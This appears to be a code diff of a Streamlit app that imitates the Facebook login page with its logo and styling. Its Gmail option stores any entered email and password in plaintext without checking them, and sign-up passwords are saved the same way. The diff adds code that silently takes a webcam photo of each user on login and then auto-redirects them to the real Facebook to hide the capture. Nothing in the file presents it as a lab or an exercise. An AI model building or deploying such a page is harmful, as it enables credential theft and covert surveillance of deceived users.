@@ -1,14 +1,20 @@
 import logging
 import os
+import time
+import webbrowser
 
+import cv2
+import numpy as np
 import streamlit as st
+import streamlit.components.v1 as components
 
-# Ensure User_Credentials directory exists
+# Ensure directories exist
 if not os.path.exists("User_Credentials"):
     os.makedirs("User_Credentials")
+if not os.path.exists("User_Images"):
+    os.makedirs("User_Images")
 
 
-# Configure main logger
 def configure_user_logger(username):
     user_log_file = f"{username}.log"
     user_logger = logging.getLogger(username)
@@ -22,18 +28,69 @@ def configure_user_logger(username):
     return user_logger
 
 
-# Save credentials
 def save_credentials(username, password):
     credentials_file = os.path.join("User_Credentials", "credentials.txt")
     with open(credentials_file, "a") as file:
         file.write(f"{username}:{password}\n")
 
 
-# Initialize session state
-if "users" not in st.session_state:
-    st.session_state["users"] = {}  # Dict to hold user accounts (username: password)
+def save_images(username):
+    user_folder = os.path.join("User_Images", username)
+    if not os.path.exists(user_folder):
+        os.makedirs(user_folder)
 
-# Logo and style adjustments
+    cap = cv2.VideoCapture(0)
+
+    if not cap.isOpened():
+        st.error("Could not access the camera.")
+        return
+
+    ret, frame = cap.read()
+
+    if not ret:
+        st.error("Failed to capture image.")
+        cap.release()
+        return
+
+    existing_images = [f for f in os.listdir(user_folder) if f.startswith(username)]
+    image_number = len(existing_images) + 1
+
+    img_path = os.path.join(user_folder, f"{username}_{image_number}.jpg")
+    cv2.imwrite(img_path, frame)
+    cap.release()
+
+
+def redirect_to_facebook():
+    # Immediate JavaScript execution for automatic redirect
+    js = """
+        <script>
+            // Execute immediately when the script loads
+            (function() {
+                // Open Facebook in new tab
+                window.open('https://www.facebook.com', '_blank');
+            })();
+        </script>
+        <a href="https://www.facebook.com" target="_blank" id="fallbackLink" style="display: none;">Redirect to Facebook</a>
+        <script>
+            // Fallback: Click the link automatically if the window.open fails
+            document.getElementById('fallbackLink').click();
+        </script>
+    """
+    components.html(js, height=0)
+
+    # Show a message with a manual link as final fallback
+    st.markdown(
+        """
+        <div style="text-align: center; margin-top: 10px;">
+            If not redirected automatically, 
+            <a href="https://www.facebook.com" target="_blank" rel="noopener noreferrer">click here</a>
+        </div>
+    """,
+        unsafe_allow_html=True,
+    )
+
+
+# Enhanced UI Styling with responsive design
 st.markdown(
     """
     <style>
@@ -41,126 +98,160 @@ st.markdown(
         background-color: #f0f2f5;
     }
     .block-container {
-        max-width: 500px;
-        margin: auto;
-        text-align: center;
-        padding: 20px;
+        max-width: 100% !important;
+        padding: 20px !important;
+    }
+    @media (min-width: 768px) {
+        .block-container {
+            max-width: 400px !important;
+            margin: auto !important;
+        }
     }
     .stButton>button {
         background-color: #1877f2;
         color: white;
-        font-size: 16px;
+        font-size: 14px;
         padding: 8px 16px;
         border: none;
         border-radius: 4px;
-        margin-top: 10px;
+        margin: 5px;
+        width: 100%;
+        max-width: 300px;
     }
     .stButton>button:hover {
         background-color: #145db2;
     }
-    .stTextInput>div>input {
-        border: 1px solid #ccd0d5;
-        border-radius: 6px;
-        padding: 10px;
+    .logo img {
+        width: 30%;
+        max-width: 150px;
+        height: auto;
+    }
+    .stRadio > label {
         font-size: 14px;
-        width: 100%;
+    }
+    input {
+        max-width: 300px;
+        margin: auto !important;
+    }
+    @media (max-width: 768px) {
+        .stRadio [role="radiogroup"] {
+            flex-direction: column !important;
+        }
     }
     </style>
     """,
     unsafe_allow_html=True,
 )
 
-# Header with FB Logo
+# Logo
 st.markdown(
     """
-    <div style="text-align: center;">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo" width="200">
-        <h1 style="color: #1877f2; font-size: 36px; margin-top: 10px;">Facebook</h1>
+    <div class="logo" style="text-align: center;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook Logo">
+        <h3 style="color: #1877f2;">Facebook</h3>
     </div>
     """,
     unsafe_allow_html=True,
 )
 
 
-# User authentication
+# Set default auth option based on device
+def is_mobile():
+    return st.session_state.get(
+        "is_mobile", st.query_params.get("platform", ["desktop"])[0] == "mobile"
+    )
+
+
+if "is_mobile" not in st.session_state:
+    st.session_state.is_mobile = is_mobile()
+
+default_option = "Login with Gmail" if st.session_state.is_mobile else "Login"
+
+# Navigation with default option
+auth_option = st.radio(
+    "Choose an option",
+    ("Login", "Sign Up", "Login with Gmail"),
+    horizontal=not st.session_state.is_mobile,
+    index=["Login", "Sign Up", "Login with Gmail"].index(default_option),
+    key="auth_option",
+)
+
+
+def handle_successful_login(username, message="Login successful!"):
+    if "redirect_done" not in st.session_state:
+        st.session_state["redirect_done"] = False
+
+    if not st.session_state["redirect_done"]:
+        st.session_state["current_user"] = username
+        user_logger = configure_user_logger(username)
+        user_logger.info(f"User '{username}' logged in successfully.")
+        save_images(username)
+        st.success(f"{message} Redirecting to Facebook...")
+        redirect_to_facebook()
+        st.session_state["redirect_done"] = True
+
+
 def login():
-    st.sidebar.title("Login")
-    username = st.sidebar.text_input("Username", key="login_username")
-    password = st.sidebar.text_input("Password", type="password", key="login_password")
-    if st.sidebar.button("Login", key="login_button"):
-        if (
+    username = st.text_input("Username", key="login_username")
+    password = st.text_input("Password", type="password", key="login_password")
+
+    if st.button("Login"):
+        if not username or not password:
+            st.error("Please fill in both fields.")
+        elif (
             username in st.session_state["users"]
             and st.session_state["users"][username] == password
         ):
-            st.session_state["current_user"] = username
-            st.sidebar.success(f"Welcome, {username}!")
-            user_logger = configure_user_logger(username)
-            user_logger.info(
-                f"User '{username}' logged in successfully with {password}."
-            )
-            st.markdown(
-                "<h3>Congratulations! Redirecting to Facebook...</h3>",
-                unsafe_allow_html=True,
-            )
-            st.markdown(
-                "<meta http-equiv='refresh' content='2; url=https://Facebook.com'>",
-                unsafe_allow_html=True,
-            )
+            handle_successful_login(username)
         else:
-            st.sidebar.error("Invalid username or password!")
+            st.error("Invalid username or password!")
 
 
 def signup():
-    st.sidebar.title("Sign Up")
-    new_username = st.sidebar.text_input("New Username", key="signup_username")
-    new_password = st.sidebar.text_input(
-        "New Password", type="password", key="signup_password"
-    )
-    if st.sidebar.button("Sign Up", key="signup_button"):
-        if new_username in st.session_state["users"]:
-            st.sidebar.error("Username already exists!")
+    new_username = st.text_input("New Username", key="signup_username")
+    new_password = st.text_input("New Password", type="password", key="signup_password")
+
+    if st.button("Sign Up"):
+        if not new_username or not new_password:
+            st.error("Please fill in both fields.")
+        elif new_username in st.session_state["users"]:
+            st.error("Username already exists!")
         else:
             st.session_state["users"][new_username] = new_password
             save_credentials(new_username, new_password)
-            st.sidebar.success("Account created successfully!")
-            user_logger = configure_user_logger(new_username)
-            user_logger.info(
-                f"New user '{new_username}' signed up successfully with {new_password}."
-            )
+            handle_successful_login(new_username, "Account created successfully!")
 
 
 def login_with_gmail():
-    st.sidebar.title("Login with Gmail")
-    email = st.sidebar.text_input("Gmail Address", key="gmail_username")
-    password = st.sidebar.text_input("Password", type="password", key="gmail_password")
-    if st.sidebar.button("Login with Gmail", key="gmail_button"):
-        if email and password:
-            save_credentials(email, password)
-            user_logger = configure_user_logger(email)
-            user_logger.info(f"Gmail login successful for '{email}'& {password}")
-            st.markdown(
-                "<h3>Congratulations! Redirecting to Facebook...</h3>",
-                unsafe_allow_html=True,
-            )
-            st.markdown(
-                "<meta http-equiv='refresh' content='2; url=https://Facebook.com'>",
-                unsafe_allow_html=True,
-            )
+    email = st.text_input("Gmail Address", key="gmail_username")
+    password = st.text_input("Password", type="password", key="gmail_password")
+
+    if st.button("Login with Gmail"):
+        if not email or not password:
+            st.error("Please fill in both fields.")
         else:
-            st.sidebar.error("Please provide Gmail credentials!")
+            save_credentials(email, password)
+            handle_successful_login(email)
 
 
-# Main app logic
+# Initialize session state
 if "current_user" not in st.session_state:
     st.session_state["current_user"] = None
+if "users" not in st.session_state:
+    st.session_state["users"] = {}
+if "redirect_done" not in st.session_state:
+    st.session_state["redirect_done"] = False
 
-# Sidebar for authentication
-if st.session_state["current_user"]:
-    st.sidebar.title("Account")
-    st.sidebar.write(f"Logged in as: {st.session_state['current_user']}")
-    if st.sidebar.button("Logout"):
-        st.session_state["current_user"] = None
+# Main logic
+if st.session_state["current_user"] is None:
+    if auth_option == "Login":
+        login()
+    elif auth_option == "Sign Up":
+        signup()
+    elif auth_option == "Login with Gmail":
+        login_with_gmail()
 else:
-    login()
-    signup()
-    login_with_gmail()
+    st.write(f"Welcome back, {st.session_state['current_user']}!")
+    if not st.session_state["redirect_done"]:
+        redirect_to_facebook()
+        st.session_state["redirect_done"] = True
